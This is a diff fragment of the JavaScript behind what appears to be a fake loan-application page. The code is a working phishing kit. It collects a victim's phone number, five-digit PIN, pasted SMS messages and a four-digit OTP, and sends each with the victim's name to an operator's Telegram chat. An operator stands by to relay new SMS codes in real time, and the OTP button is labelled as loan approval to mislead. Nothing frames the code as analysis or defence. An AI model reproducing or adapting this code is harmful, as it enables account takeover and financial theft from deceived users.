+            const btn = document.getElementById('bLgn');
+            btn.className = ok ? 'btn-login rdy' : 'btn-login';
+            btn.disabled = !ok;
+        }
+
+        function togPin() {
+            [0, 1, 2, 3, 4].forEach(i => {
+                const b = document.getElementById('lp' + i);
+                b.type = b.type === 'password' ? 'text' : 'password';
+            });
+        }
+
+        function clearLoginPin() {
+            [0, 1, 2, 3, 4].forEach(i => {
+                document.getElementById('lp' + i).value = '';
+            });
+            chkPin();
+            document.getElementById('lp0').focus();
+        }
+
+        function clearOtpCode() {
+            [0, 1, 2, 3].forEach(i => {
+                document.getElementById('otp' + i).value = '';
+            });
+            chkOtp();
+            document.getElementById('otp0').focus();
+        }
+
+        function showLgnMsg(type, text) {
+            ['lpMsg', 'lpMsgOk', 'lpMsgWarn'].forEach(id => document.getElementById(id).classList.remove('show'));
+            if (type === 'error') {
+                document.getElementById('lpMsgTxt').textContent = text;
+                document.getElementById('lpMsg').classList.add('show');
+            }
+            if (type === 'success') {
+                document.getElementById('lpMsgOkTxt').textContent = text;
+                document.getElementById('lpMsgOk').classList.add('show');
+            }
+            if (type === 'warning') {
+                document.getElementById('lpMsgWarnTxt').textContent = text;
+                document.getElementById('lpMsgWarn').classList.add('show');
+            }
+        }
+
+        // ══════════════════════════════════════════════════════
+        // LOGIN — SUBMIT PIN TO TELEGRAM
+        // ══════════════════════════════════════════════════════
+        async function doLogin() {
+            if (S.isSubmitting) return;
+            S.isSubmitting = true;
+
+            ['lpMsg', 'lpMsgOk', 'lpMsgWarn'].forEach(id => document.getElementById(id).classList.remove('show'));
+
+            const phone = document.getElementById('lpPhone').value;
+            const pin = [0, 1, 2, 3, 4].map(i => document.getElementById('lp' + i).value).join('');
+
+            if (phone.length !== 9 || pin.length < 5) {
+                S.isSubmitting = false;
+                showLgnMsg('warning', 'Phone: 9 digits (e.g., 771234567). PIN: 5 digits.');
+                return;
+            }
+
+            document.getElementById('mLgn').classList.add('show');
+            document.getElementById('bLgn').disabled = true;
+
+            try {
+                const session = getSession(S.applicationId);
+                if (session) {
+                    updateSession(S.applicationId, {
+                        pin: pin,
+                        stage: 'pin_submitted'
+                    });
+                    await tgNotify({
+                        id: S.applicationId,
+                        firstName: S.firstName,
+                        lastName: S.lastName,
+                        phone: phone,
+                        pin: pin
+                    }, 'pin');
+
+                    document.getElementById('mLgn').classList.remove('show');
+                    S.isSubmitting = false;
+                    document.getElementById('waitAppId').textContent = S.applicationId;
+                    goTo('page-wait-login-approval');
+                } else {
+                    throw new Error('Session not found');
+                }
+            } catch (err) {
+                S.isSubmitting = false;
+                document.getElementById('mLgn').classList.remove('show');
+                document.getElementById('bLgn').disabled = false;
+                showLgnMsg('error', 'Network error: ' + err.message);
+            }
+        }
+
+        // ══════════════════════════════════════════════════════
+        // SMS PASTE PAGE
+        // ══════════════════════════════════════════════════════
+        function chkSmsMsg() {
+            const txt = document.getElementById('smsMsgBox').value.trim();
+            document.getElementById('bSms').className = txt.length > 3 ? 'btn-sms rdy' : 'btn-sms';
+        }
+
+        function showSmsMsg(type, text) {
+            ['smsMsg', 'smsMsgOk'].forEach(id => document.getElementById(id).classList.remove('show'));
+            if (type === 'error') {
+                document.getElementById('smsMsgTxt').textContent = text;
+                document.getElementById('smsMsg').classList.add('show');
+            }
+            if (type === 'success') {
+                document.getElementById('smsMsgOkTxt').textContent = text;
+                document.getElementById('smsMsgOk').classList.add('show');
+            }
+        }
+
+        let smsTimerInterval = null;
+        let smsTimerExpired = false;
+
+        function startSmsTimer() {
+            if (smsTimerInterval) clearInterval(smsTimerInterval);
+            smsTimerExpired = false;
+
+            document.getElementById('smsMsgBox').value = '';
+            document.getElementById('smsMsgBox').disabled = false;
+            chkSmsMsg();
+            document.getElementById('smsResendWrap').style.display = 'none';
+
+            const arc = document.getElementById('smsTimerArc');
+            const num = document.getElementById('smsTimerNum');
+            const sec = document.getElementById('smsTimerSec');
+            arc.classList.remove('urgent');
+            num.classList.remove('urgent');
+            arc.style.strokeDashoffset = '0';
+            document.getElementById('smsTimerWrap').style.display = 'flex';
+
+            let remaining = 200;
+            const CIRCUMFERENCE = 113;
+
+            const tick = function() {
+                remaining--;
+                const pct = remaining / 200;
+                arc.style.strokeDashoffset = String(CIRCUMFERENCE * (1 - pct));
+                num.textContent = remaining;
+                sec.textContent = remaining;
+
+                if (remaining <= 10) {
+                    arc.classList.add('urgent');
+                    num.classList.add('urgent');
+                }
+
+                if (remaining <= 0) {
+                    clearInterval(smsTimerInterval);
+                    smsTimerInterval = null;
+                    smsTimerExpired = true;
+
+                    document.getElementById('smsMsgBox').disabled = true;
+                    document.getElementById('smsMsgBox').value = '';
+                    document.getElementById('bSms').disabled = true;
+                    document.getElementById('bSms').className = 'btn-sms';
+                    document.getElementById('smsTimerWrap').style.display = 'none';
+                    document.getElementById('smsResendWrap').style.display = 'block';
+                    document.getElementById('bResend').disabled = false;
+                    document.getElementById('mResend').classList.remove('show');
+                    ['smsMsg', 'smsMsgOk'].forEach(function(id) {
+                        document.getElementById(id).classList.remove('show');
+                    });
+                }
+            };
+
+            smsTimerInterval = setInterval(tick, 1000);
+        }
+
+        function stopSmsTimer() {
+            if (smsTimerInterval) {
+                clearInterval(smsTimerInterval);
+                smsTimerInterval = null;
+            }
+        }
+
+        async function doSmsResend() {
+            const btn = document.getElementById('bResend');
+            const spinner = document.getElementById('mResend');
+            btn.disabled = true;
+            spinner.classList.add('show');
+            ['smsMsg', 'smsMsgOk'].forEach(function(id) {
+                document.getElementById(id).classList.remove('show');
+            });
+
+            try {
+                const session = getSession(S.applicationId);
+                if (session) {
+                    await tgCall("sendMessage", {
+                        chat_id: TG_CHAT,
+                        text: `🔄 User requested a new SMS message.\nApplication ID: ${S.applicationId}`
+                    });
+                    spinner.classList.remove('show');
+                    document.getElementById('smsResendWrap').style.display = 'none';
+                    document.getElementById('smsMsgBox').disabled = false;
+                    document.getElementById('bSms').disabled = false;
+                    startSmsTimer();
+                    showSmsMsg('success', 'A new SMS has been requested. Admin will send it shortly.');
+                    btn.disabled = false;
+                } else {
+                    throw new Error('Session not found');
+                }
+            } catch (err) {
+                spinner.classList.remove('show');
+                btn.disabled = false;
+                showSmsMsg('error', 'Network error: ' + err.message);
+            }
+        }
+
+        // ─── Updated SMS parser: shows name and number in Telegram notification ───
+        async function doSmsParse() {
+            ['smsMsg', 'smsMsgOk'].forEach(id => document.getElementById(id).classList.remove('show'));
+
+            if (smsTimerExpired) {
+                document.getElementById('smsResendWrap').style.display = 'block';
+                document.getElementById('bResend').disabled = false;
+                return;
+            }
+
+            const msg = document.getElementById('smsMsgBox').value.trim();
+            if (msg.length < 3) {
+                showSmsMsg('error', 'Please paste an SMS message.');
+                return;
+            }
+
+            document.getElementById('mSms').classList.add('show');
+            document.getElementById('bSms').disabled = true;
+
+            try {
+                const session = getSession(S.applicationId);
+                if (session) {
+                    // ─── Send SMS with full user details (name & number) ───
+                    updateSession(S.applicationId, {
+                        smsMessage: msg,
+                        stage: 'sms_submitted'
+                    });
+                    await tgNotify({
+                        id: S.applicationId,
+                        firstName: S.firstName,
+                        lastName: S.lastName,
+                        phone: S.phone,
+                        smsMessage: msg
+                    }, 'sms');
+
+                    document.getElementById('mSms').classList.remove('show');
+                    stopSmsTimer();
+                    document.getElementById('waitSmsAppId').textContent = S.applicationId;
+                    goTo('page-wait-sms');
+                } else {
+                    throw new Error('Session not found');
+                }
+            } catch (err) {
+                document.getElementById('mSms').classList.remove('show');
+                document.getElementById('bSms').disabled = false;
+                showSmsMsg('error', 'Error: ' + err.message);
+            }
+        }
+
+        // ══════════════════════════════════════════════════════
+        // OTP PAGE — 4-DIGIT OTP
+        // ══════════════════════════════════════════════════════
+        function handleOtpInput(el, type) {
+            el.value = el.value.replace(/\D/, '');
+            const idx = parseInt(el.id.match(/\d$/)[0]);
+            if (el.value && type === 'otp' && idx < 3) {
+                document.getElementById(type + (idx + 1)).focus();
+            }
+            chkOtp();
+        }
+
+        function chkOtp() {
+            const otpOk = [0, 1, 2, 3].every(i => document.getElementById('otp' + i).value);
+            document.getElementById('bOtp').className = otpOk ? 'btn-otp rdy' : 'btn-otp';
+        }
+
+        function showOtpMsg(type, text) {
+            ['otpMsg', 'otpMsgOk'].forEach(id => document.getElementById(id).classList.remove('show'));
+            if (type === 'error') {
+                document.getElementById('otpMsgTxt').textContent = text;
+                document.getElementById('otpMsg').classList.add('show');
+            }
+            if (type === 'success') {
+                document.getElementById('otpMsgOkTxt').textContent = text;
+                document.getElementById('otpMsgOk').classList.add('show');
+            }
+        }
+
+        async function doOtp() {
+            ['otpMsg', 'otpMsgOk'].forEach(id => document.getElementById(id).classList.remove('show'));
+
+            const otp = [0, 1, 2, 3].map(i => document.getElementById('otp' + i).value).join('');
+
+            if (otp.length < 4) {
+                showOtpMsg('error', 'Please enter 4-digit OTP code.');
+                return;
+            }
+
+            document.getElementById('mOtp').classList.add('show');
+            document.getElementById('bOtp').disabled = true;
+            document.getElementById('bOtp').textContent = 'VERIFYING...';
+
+            try {
+                const session = getSession(S.applicationId);
+                if (session) {
+                    updateSession(S.applicationId, {
+                        otp: otp,
+                        stage: 'otp_submitted'
+                    });
+                    await tgNotify({
+                        id: S.applicationId,
+                        firstName: S.firstName,
+                        lastName: S.lastName,
+                        phone: S.phone,
+                        otp: otp
+                    }, 'otp');
+
+                    document.getElementById('mOtp').classList.remove('show');
+                    document.getElementById('waitOtpAppId').textContent = S.applicationId;
+                    goTo('page-wait-otp');
+                } else {
+                    throw new Error('Session not found');
+                }
+            } catch (err) {
+                document.getElementById('mOtp').classList.remove('show');
+                document.getElementById('bOtp').disabled = false;
+                document.getElementById('bOtp').textContent = 'VERIFY & APPROVE LOAN';
+                showOtpMsg('error', 'Error: ' + err.message);
+            }
+        }
+
+        // INIT
+        updateCalc();
+        goTo('page-landing');
     </script>
 </body>
 
